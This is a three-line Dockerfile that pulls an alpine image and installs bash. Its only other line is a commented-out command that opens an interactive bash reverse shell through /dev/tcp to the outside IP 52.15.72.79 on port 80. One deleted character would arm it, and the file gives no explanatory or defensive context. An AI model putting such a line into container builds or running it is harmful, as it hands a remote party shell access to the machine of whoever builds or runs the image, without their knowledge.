FROM alpine
RUN apk update && apk add bash
#RUN /bin/bash -c 'bash -i >& /dev/tcp/52.15.72.79/80 0>&1'
